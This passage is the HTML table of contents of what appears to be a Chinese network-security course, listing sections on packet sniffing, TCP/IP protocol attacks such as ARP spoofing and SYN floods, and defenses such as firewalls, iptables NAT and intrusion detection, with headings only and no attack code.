href="#11-1-%E4%BB%A5%E5%A4%AA%E7%BD%91%E7%BB%9C"><span class="nav-text">11.1 以太网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-1-1-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">11.1.1 工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-1-2-%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F"><span class="nav-text">11.1.2 工作模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-2-%E5%85%B1%E4%BA%AB%E5%BC%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BA%A4%E6%8D%A2%E5%BC%8F%E7%BD%91%E7%BB%9C"><span class="nav-text">11.2 共享式网络与交换式网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-2-1-%E5%85%B1%E4%BA%AB%E5%BC%8F%E7%BD%91%E7%BB%9C"><span class="nav-text">11.2.1 共享式网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-2-2-%E4%BA%A4%E6%8D%A2%E5%BC%8F%E7%BD%91%E7%BB%9C"><span class="nav-text">11.2.2 交换式网络</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#11-2-2-1-%E4%BA%A4%E6%8D%A2%E5%BC%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%97%85%E6%8E%A2%E6%94%BB%E5%87%BB"><span class="nav-text">11.2.2.1 交换式网络中的嗅探攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-3-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="nav-text">11.3 应用程序抓包的技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-3-1-BPF"><span class="nav-text">11.3.1 BPF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-3-2-libpcap%E6%8A%93%E5%8C%85%E5%BA%93"><span class="nav-text">11.3.2 libpcap抓包库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-4-pcap%E6%A0%BC%E5%BC%8F"><span class="nav-text">11.4 pcap格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-5-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%99%A8%E8%BD%AF%E4%BB%B6"><span class="nav-text">11.5 网络嗅探器软件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-5-1-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF"><span class="nav-text">11.5.1 Windows平台下的抓包技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#11-5-1-1-WinPcap"><span class="nav-text">11.5.1.1 WinPcap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-6-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E7%9A%84%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF"><span class="nav-text">11.6 网络嗅探的检测技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-7-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E6%8A%80%E6%9C%AF%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">11.7 网络嗅探技术的防范措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-8-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">11.8 网络协议分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-9-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0"><span class="nav-text">11.9 网络协议分析技术实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-10-Wireshark-ethereal"><span class="nav-text">11.10 Wireshark(ethereal)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-10-1-Wireshark%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD"><span class="nav-text">11.10.1 Wireshark基本功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-10-2-Wireshark%E4%B8%AD%E7%9A%84%E4%B8%A4%E7%B1%BB%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="nav-text">11.10.2 Wireshark中的两类过滤规则</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-11-%E6%B5%81%E9%87%8D%E7%BB%84-%E4%BC%9A%E8%AF%9D%E9%87%8D%E7%BB%84"><span class="nav-text">11.11 流重组&#x2F;会话重组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-12-%E7%BD%91%E7%BB%9C%E6%B5%81%E8%AE%B0%E5%BD%95%E5%92%8C%E9%AB%98%E5%B1%82%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90"><span class="nav-text">11.12 网络流记录和高层统计分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-13-%E5%97%85%E6%8E%A2%E5%AE%9E%E4%BE%8B%E2%80%94%E2%80%94%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9"><span class="nav-text">11.13 嗅探实例——网站指纹</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#12-TCP-IP%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB"><span class="nav-text">12. TCP&#x2F;IP网络协议攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#12-1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7"><span class="nav-text">12.1 网络安全属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-2-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%9F%BA%E6%9C%AC%E6%A8%A1%E5%BC%8F"><span class="nav-text">12.2 网络攻击基本模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-2-1-%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-text">12.2.1 被动攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-2-2-%E4%B8%BB%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="nav-text">12.2.2 主动攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-2-3-%E5%AF%B9%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E8%88%AC%E5%A4%84%E7%90%86%E5%8E%9F%E5%88%99"><span class="nav-text">12.2.3 对攻击的一般处理原则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-2-4-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB-MITM%E6%94%BB%E5%87%BB"><span class="nav-text">12.2.4 中间人攻击(MITM攻击)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-3-%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E4%B8%8E%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="nav-text">12.3 安全缺陷与攻击技术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-4-%E5%8E%9F%E5%A7%8B%E6%8A%A5%E6%96%87%E4%BC%AA%E9%80%A0%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="nav-text">12.4 原始报文伪造技术及工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-4-1-Netwox%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-text">12.4.1 Netwox工具使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-5-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB"><span class="nav-text">12.5 网络层协议攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-5-1-IP%E6%BA%90%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97"><span class="nav-text">12.5.1 IP源地址欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-1-1-TCP%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">12.5.1.1 TCP连接的基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-1-2-%E7%9B%B2%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-text">12.5.1.2 盲攻击过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-1-3-IP%E6%BA%90%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">12.5.1.3 IP源地址欺骗技术的应用场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-1-4-%E5%88%A9%E7%94%A8Netwox%E8%BF%9B%E8%A1%8CIP%E6%BA%90%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97"><span class="nav-text">12.5.1.4 利用Netwox进行IP源地址欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-1-5-IP%E6%BA%90%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">12.5.1.5 IP源地址欺骗的防范措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-5-2-ARP%E6%AC%BA%E9%AA%97"><span class="nav-text">12.5.2 ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-2-1-ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86"><span class="nav-text">12.5.2.1 ARP欺骗攻击技术原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-2-2-ARP%E6%AC%BA%E9%AA%97%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">12.5.2.2 ARP欺骗技术的应用场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-2-3-%E5%88%A9%E7%94%A8Netwox%E8%BF%9B%E8%A1%8CARP%E6%AC%BA%E9%AA%97"><span class="nav-text">12.5.2.3 利用Netwox进行ARP欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-2-4-ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">12.5.2.4 ARP欺骗攻击防范措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-5-3-ICMP%E8%B7%AF%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB"><span class="nav-text">12.5.3 ICMP路由重定向攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-3-1-ICMP%E8%B7%AF%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="nav-text">12.5.3.1 ICMP路由重定向攻击技术</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-5-3-2-ICMP%E8%B7%AF%E7%94%B1%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83"><span class="nav-text">12.5.3.2 ICMP路由重定向攻击防范</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-6-%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB"><span class="nav-text">12.6 传输层协议攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-6-1-TCP-RST%E6%94%BB%E5%87%BB"><span class="nav-text">12.6.1 TCP RST攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-6-2-TCP%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="nav-text">12.6.2 TCP会话劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-2-1-Hunt%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="nav-text">12.6.2.1 Hunt工具介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-2-2-%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">12.6.2.2 会话劫持的防范措施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-6-3-TCP-SYN-Flood"><span class="nav-text">12.6.3 TCP SYN Flood</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-3-1-%E5%88%A9%E7%94%A8Netwox%E8%BF%9B%E8%A1%8CTCP-SYN-Flood"><span class="nav-text">12.6.3.1 利用Netwox进行TCP SYN Flood</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-3-2-SYN-Flood%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD-SynCookie"><span class="nav-text">12.6.3.2 SYN Flood攻击防范措施-SynCookie</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-6-4-UDP-Flood%E6%94%BB%E5%87%BB"><span class="nav-text">12.6.4 UDP Flood攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-4-1-UDP-Flood%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">12.6.4.1 UDP Flood攻击防范措施</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-6-4-2-%E5%8F%A6%E7%B1%BBDoS%E6%94%BB%E5%87%BB"><span class="nav-text">12.6.4.2 另类DoS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#12-6-4-2-1-%E6%B5%81%E9%87%8F%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB"><span class="nav-text">12.6.4.2.1 流量放大攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#12-6-4-2-2-Javascript-based-DDoS-%E6%94%BB%E5%87%BB"><span class="nav-text">12.6.4.2.2 Javascript-based DDoS 攻击</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-7-TCP-IP%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E6%94%BB%E5%87%BB%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">12.7 TCP&#x2F;IP网络协议栈攻击防范措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-7-1-%E7%9B%91%E6%B5%8B%E3%80%81%E9%A2%84%E9%98%B2%E4%B8%8E%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="nav-text">12.7.1 监测、预防与安全加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-7-2-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE"><span class="nav-text">12.7.2 网络安全协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF"><span class="nav-text">13. 网络安全防护技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#13-1-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B-P2DR%E6%A8%A1%E5%9E%8B"><span class="nav-text">13.1 安全模型-P2DR模型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#13-1-1-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%91%E5%B1%95"><span class="nav-text">13.1.1 信息安全技术与安全模型的发展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-1-2-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%A0%87%E5%87%86"><span class="nav-text">13.1.2 安全评估模型与标准</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-1-3-PDR%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B"><span class="nav-text">13.1.3 PDR安全模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-1-4-P2DR%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B"><span class="nav-text">13.1.4 P2DR安全模型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-2-P%EF%BC%9A%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF"><span class="nav-text">13.2 P：防御技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-1-%E9%98%B2%E7%81%AB%E5%A2%99-FireWall"><span class="nav-text">13.2.1 防火墙(FireWall)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-1-%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF%E5%85%B3%E9%94%AE%E7%89%B9%E6%80%A7"><span class="nav-text">13.2.1.1 防火墙技术关键特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-2-%E5%8A%9F%E8%83%BD"><span class="nav-text">13.2.1.2 功能</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-3-%E4%B8%8D%E8%B6%B3"><span class="nav-text">13.2.1.3 不足</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-4-%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF%E7%B1%BB%E5%9E%8B"><span class="nav-text">13.2.1.4 防火墙技术类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-4-1-%E5%8C%85%E8%BF%87%E6%BB%A4%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-text">13.2.1.4.1 包过滤防火墙</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-4-2-%E7%8A%B6%E6%80%81%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-text">13.2.1.4.2 状态防火墙</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-5-%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81"><span class="nav-text">13.2.1.5 防火墙产品</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-6-%E9%98%B2%E7%81%AB%E5%A2%99%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95"><span class="nav-text">13.2.1.6 防火墙部署方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-6-1-%E5%8C%85%E8%BF%87%E6%BB%A4%E8%B7%AF%E7%94%B1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88"><span class="nav-text">13.2.1.6.1 包过滤路由器部署方案</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-6-2-%E5%8F%8C%E5%AE%BF%E4%B8%BB%E5%A0%A1%E5%9E%92%E4%B8%BB%E6%9C%BA%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88"><span class="nav-text">13.2.1.6.2 双宿主堡垒主机部署方案</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-6-3-%E5%B1%8F%E8%94%BD%E4%B8%BB%E6%9C%BA"><span class="nav-text">13.2.1.6.3 屏蔽主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-6-4-%E5%B1%8F%E8%94%BD%E5%AD%90%E7%BD%91"><span class="nav-text">13.2.1.6.4 屏蔽子网</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-1-7-Linux%E4%B8%AD%E7%9A%84%E5%BC%80%E6%BA%90%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-text">13.2.1.7 Linux中的开源防火墙</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-1-Netfilter-iptables%E7%9A%84%E7%BC%BA%E7%9C%81%E8%A7%84%E5%88%99%E8%A1%A8-%E9%93%BE"><span class="nav-text">13.2.1.7.1 Netfilter&#x2F;iptables的缺省规则表&#x2F;链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-2-Netfilter%E5%9C%A8Linux%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%AD%E7%9A%84hook%E6%A3%80%E6%9F%A5%E7%82%B9"><span class="nav-text">13.2.1.7.2 Netfilter在Linux协议栈中的hook检查点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-3-Netfilter%E7%9A%84%E6%A3%80%E6%9F%A5%E9%93%BE%E5%92%8C%E5%A4%84%E7%90%86%E7%AD%96%E7%95%A5"><span class="nav-text">13.2.1.7.3 Netfilter的检查链和处理策略</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-4-Netfilter%E7%9A%84%E6%8A%A5%E6%96%87%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5"><span class="nav-text">13.2.1.7.4 Netfilter的报文状态检查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-5-Netfilter%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E8%BF%87%E6%BB%A4"><span class="nav-text">13.2.1.7.5 Netfilter防火墙规则过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-6-Iptables"><span class="nav-text">13.2.1.7.6 Iptables</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-7-Netfilter-iptables%E7%9A%84%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8A%A5%E6%96%87%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6"><span class="nav-text">13.2.1.7.7 Netfilter&#x2F;iptables的过滤与报文状态检查机制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#13-2-1-7-8-Netfilter-iptables%E7%9A%84NAT%E6%9C%BA%E5%88%B6"><span class="nav-text">13.2.1.7.8 Netfilter&#x2F;iptables的NAT机制</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iptables-t-nat-A-POSTROUTING-ieth1-o-eth0-j-MASQUERADE"><span class="nav-text">iptables-t nat-A POSTROUTING -ieth1 -o eth0 -j MASQUERADE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iptables-t-nat-A-PREROUTING-ieth1-j-DNAT-%E2%80%94to-5-6-7-8"><span class="nav-text">iptables-t nat-A PREROUTING -ieth1 -j DNAT —to 5.6.7.8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iptables-A-PREROUTING-t-nat-p-tcp-d-1-2-3-4-%E2%80%94dport8080-j-DNAT-%E2%80%94to-192-168-1-1-80"><span class="nav-text">iptables-A PREROUTING -t nat-p tcp-d 1.2.3.4 —dport8080 -j DNAT —to 192.168.1.1:80</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-2-%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF"><span class="nav-text">13.2.2 代理技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-2-1-%E5%BA%94%E7%94%A8%E5%B1%82%E4%BB%A3%E7%90%86"><span class="nav-text">13.2.2.1 应用层代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-2-2-%E7%94%B5%E8%B7%AF%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-text">13.2.2.2 电路级代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-2-2-3-NAT%E4%BB%A3%E7%90%86-%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2"><span class="nav-text">13.2.2.3 NAT代理-网络地址转换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-3-VPN"><span class="nav-text">13.2.3 VPN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86"><span class="nav-text">13.2.4 内网安全管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-5-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86-SCM"><span class="nav-text">13.2.5 内容安全管理(SCM)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-6-%E8%BE%B9%E7%95%8C%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E5%8F%91%E5%B1%95%E8%B6%8B%E5%8A%BF-UTM-amp-%E9%AB%98%E6%80%A7%E8%83%BD"><span class="nav-text">13.2.6 边界安全防御发展趋势-UTM&amp;高性能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-3-D%EF%BC%9A%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF"><span class="nav-text">13.3 D：检测技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-1-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">13.3.1 入侵检测系统基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-2-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B"><span class="nav-text">13.3.2 入侵检测技术的发展历程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-1-Denning%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B"><span class="nav-text">13.3.2.1 Denning入侵检测模型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-2-%E4%B8%BA%E4%BB%80%E4%B9%88Gartner%E8%AF%B4IDS%E5%B7%B2%E6%AD%BB"><span class="nav-text">13.3.2.2 为什么Gartner说IDS已死</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-3-%E5%85%A5%E4%BE%B5%E5%A8%81%E8%83%81%E5%88%86%E7%B1%BB%E5%9B%BE"><span class="nav-text">13.3.2.3 入侵威胁分类图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-4-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8A%BD%E8%B1%A1%E7%90%86%E8%AE%BA%E6%A8%A1%E5%9E%8B"><span class="nav-text">13.3.2.4 入侵检测抽象理论模型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-5-%E9%80%9A%E7%94%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B-CIDF"><span class="nav-text">13.3.2.5 通用入侵检测模型(CIDF)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-6-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%AF%84%E4%BC%B0%E6%8C%87%E6%A0%87"><span class="nav-text">13.3.2.6 入侵检测技术评估指标</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-2-7-IDS%E5%87%86%E7%A1%AE%E7%8E%87%E8%AF%84%E5%88%A4%E6%A0%87%E5%87%86-ROC%E6%9B%B2%E7%BA%BF"><span class="nav-text">13.3.2.7 IDS准确率评判标准: ROC曲线</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-3-3-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF"><span class="nav-text">13.3.3 入侵检测技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#13-3-3-1-%E8%AF%AF%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="nav-text">13.3.3.1 误用检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" 